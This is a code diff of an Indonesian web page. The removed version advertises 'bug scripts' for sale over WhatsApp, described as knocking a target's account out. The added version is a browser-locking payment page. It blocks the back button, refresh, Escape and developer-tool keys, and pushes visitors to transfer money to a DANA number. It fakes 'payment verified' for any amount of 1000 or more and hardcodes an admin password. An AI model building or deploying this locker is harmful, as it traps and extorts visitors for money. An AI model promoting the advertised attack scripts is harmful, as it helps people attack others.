@@ -1,72 +1,161 @@
-<!DOCTYPE html><html lang="id">
+
+<!DOCTYPE html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Corvus Invinity Store</title>
+  <meta charset="UTF-8">
+  <title>🔒 Web Super Terkunci</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: #0a0a0a;
-      color: white;
+      padding: 0;
+      font-family: sans-serif;
+      background: #000;
+      color: #0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
     .card {
       background: #111;
-      border-radius: 10px;
-      padding: 20px;
-      margin: 20px;
-      box-shadow: 0 0 20px rgba(255, 0, 128, 0.3);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px #0f0;
+      width: 90%;
+      max-width: 400px;
       text-align: center;
     }
-    .card img {
-      width: 100%;
+    input, button {
+      padding: 10px;
+      margin-top: 10px;
+      width: 90%;
       border-radius: 8px;
+      border: none;
+      font-size: 1em;
     }
-    .title {
-      color: #ff0077;
-      font-size: 1.4rem;
+    input {
+      background: #222;
+      color: #0f0;
+    }
+    button {
+      background: #0f0;
+      color: #000;
       font-weight: bold;
-      margin: 10px 0 5px 0;
+      cursor: pointer;
     }
-    .price {
-      color: #00ffc3;
-      font-size: 1.2rem;
+    .dana-box {
+      background: #000;
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid #0f0;
       margin-bottom: 10px;
-    }
-    .desc {
-      font-size: 0.95rem;
-      color: #ccc;
-    }
-    .wa-btn {
-      margin-top: 15px;
-      display: inline-block;
-      background-color: #25D366;
-      color: white;
-      padding: 10px 20px;
-      border-radius: 6px;
-      text-decoration: none;
-      font-weight: bold;
-      transition: background 0.3s;
-    }
-    .wa-btn:hover {
-      background-color: #128C7E;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <img src="https://files.catbox.moe/iwk1z3.jpg" alt="SC CORVUS INVINITY" />
-    <div class="title">SC CORVUS</div>
-    <div class="price">Harga: 10K</div>
-    <div class="desc">Ini adalah sebuah script bug yang langsung membuat lawan hitam, jangan untuk guru/orang tidak bersalah karena sangat berakibat fatal!!</div>
-    <a class="wa-btn" href="https://wa.me/6287889308331?text=Saya%20mau%20beli%20sc%20corvus">Pesan via WhatsApp</a>
+  <div class="card" id="login-card">
+    <h2>🔐 Login Admin</h2>
+    <input type="text" id="username" placeholder="Username Admin">
+    <br>
+    <input type="password" id="password" placeholder="Password Admin">
+    <br>
+    <button onclick="login()">Login</button>
+    <p id="loginStatus"></p>
   </div>
-  <div class="card">
-    <img src="https://files.catbox.moe/fmtv4c.jpg" alt="SC SYREN" />
-    <div class="title">SC SYREN</div>
-    <div class="price">Harga: 10K</div>
-    <div class="desc">Ini adalah sebuah script bug yang ganas jangan gunakan karena berakibat fatal!!</div>
-    <a class="wa-btn" href="https://wa.me/6287889308331?text=Saya%20mau%20beli%20sc%20syren">Pesan via WhatsApp</a>
+
+  <div class="card" id="main-card" style="display: none;">
+    <h2>🔒 Web Terkunci</h2>
+    <p>Transfer bebas ke DANA:</p>
+
+    <div class="dana-box">
+      <strong>Nomor DANA:</strong><br>
+      <span id="dana-number">62895373244456</span><br>
+      <button onclick="salinDana()">Salin Nomor</button>
+    </div>
+
+    <input type="number" id="amount" placeholder="Masukkan jumlah (minimal 1000)">
+    <br>
+    <button onclick="bayar()">Saya Sudah Bayar</button>
+    <p id="status"></p>
+    <br>
+    <button id="exitBtn" disabled onclick="keluar()">Keluar ke Web</button>
   </div>
+
+  <script>
+    let sudahBayar = false;
+    let isAdmin = false;
+
+    function login() {
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+
+      if (user === "admin" && pass === "pinzyzyzy123") {
+        isAdmin = true;
+        document.getElementById("login-card").style.display = "none";
+        document.getElementById("main-card").style.display = "block";
+      } else {
+        document.getElementById("loginStatus").innerText = "❌ Login gagal!";
+      }
+    }
+
+    function bayar() {
+      const val = parseInt(document.getElementById("amount").value);
+      if (!val || val < 1000) {
+        alert("Minimal bayar 1000!");
+        return;
+      }
+
+      sudahBayar = true;
+      document.getElementById("status").innerText = "✅ Pembayaran berhasil diverifikasi.";
+      if (isAdmin) document.getElementById("exitBtn").disabled = false;
+    }
+
+    function keluar() {
+      if (sudahBayar && isAdmin) {
+        alert("Terima kasih! Mengarahkan ke halaman...");
+        window.location.href = "https://google.com"; // Ubah ke URL kamu
+      } else {
+        alert("Akses keluar hanya untuk admin.");
+      }
+    }
+
+    function salinDana() {
+      const dana = document.getElementById("dana-number").textContent;
+      navigator.clipboard.writeText(dana).then(() => {
+        alert("Nomor DANA berhasil disalin!");
+      });
+    }
+
+    window.onbeforeunload = function () {
+      return "Kamu belum bayar atau belum login admin!";
+    };
+
+    history.pushState(null, null, location.href);
+    window.addEventListener("popstate", function () {
+      history.pushState(null, null, location.href);
+      alert("Tombol kembali diblokir.");
+    });
+
+    document.addEventListener("keydown", function (e) {
+      if (!sudahBayar) {
+        if (
+          e.key === "F5" ||
+          e.key === "r" && e.ctrlKey ||
+          e.key === "R" && e.ctrlKey ||
+          e.key === "Escape" ||
+          e.key === "F12" ||
+          e.key === "u" && e.ctrlKey
+        ) {
+          e.preventDefault();
+          alert("Diblokir sampai kamu bayar!");
+        }
+      }
+    });
+
+    setInterval(() => {
+      document.title = sudahBayar ? "✅ Sudah bayar" : "💸 Bayar dulu sebelum keluar!";
+    }, 1500);
+  </script>
 </body>
 </html>
